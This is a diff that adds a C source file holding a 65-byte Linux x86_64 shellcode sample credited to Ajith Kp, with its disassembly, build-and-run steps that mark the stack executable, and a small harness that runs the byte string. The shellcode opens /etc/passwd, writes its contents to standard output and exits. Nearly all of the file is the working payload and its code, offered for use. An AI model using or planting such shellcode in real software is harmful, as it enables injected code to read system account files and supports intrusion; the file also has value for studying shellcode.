@@ -1,0 +1,66 @@
+/*
+---------------------------------------------------------------------------------------------------
+
+Linux/x86_64 - Read /etc/passwd - 65 bytes
+
+Ajith Kp [ @ajithkp560 ] [ http://www.terminalcoders.blogspot.com ]
+
+Om Asato Maa Sad-Gamaya |
+Tamaso Maa Jyotir-Gamaya |
+Mrtyor-Maa Amrtam Gamaya |
+Om Shaantih Shaantih Shaantih |
+
+---------------------------------------------------------------------------------------------------
+Disassembly of section .text:
+
+Disassembly of section .text:
+
+0000000000400080 <.text>:
+  400080: eb 2f                 jmp    0x4000b1
+  400082: 5f                    pop    rdi
+  400083: 6a 02                 push   0x2
+  400085: 58                    pop    rax
+  400086: 48 31 f6              xor    rsi,rsi
+  400089: 0f 05                 syscall 
+  40008b: 66 81 ec ef 0f        sub    sp,0xfef
+  400090: 48 8d 34 24           lea    rsi,[rsp]
+  400094: 48 97                 xchg   rdi,rax
+  400096: 48 31 d2              xor    rdx,rdx
+  400099: 66 ba ef 0f           mov    dx,0xfef
+  40009d: 48 31 c0              xor    rax,rax
+  4000a0: 0f 05                 syscall 
+  4000a2: 6a 01                 push   0x1
+  4000a4: 5f                    pop    rdi
+  4000a5: 48 92                 xchg   rdx,rax
+  4000a7: 6a 01                 push   0x1
+  4000a9: 58                    pop    rax
+  4000aa: 0f 05                 syscall 
+  4000ac: 6a 3c                 push   0x3c
+  4000ae: 58                    pop    rax
+  4000af: 0f 05                 syscall 
+  4000b1: e8 cc ff ff ff        call   0x400082
+  4000b6: 2f                    (bad)  
+  4000b7: 65 74 63              gs je  0x40011d
+  4000ba: 2f                    (bad)  
+  4000bb: 70 61                 jo     0x40011e
+  4000bd: 73 73                 jae    0x400132
+  4000bf: 77 64                 ja     0x400125
+
+---------------------------------------------------------------------------------------------------
+
+How To Run
+
+$ gcc -o read_passwd read_passwd.c
+$ execstack -s read_passwd
+$ ./read_passwd
+
+---------------------------------------------------------------------------------------------------
+*/
+#include <stdio.h>
+char sh[]="\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";
+void main(int argc, char **argv)
+{
+	int (*func)();
+	func = (int (*)()) sh;
+	(int)(*func)();
+}
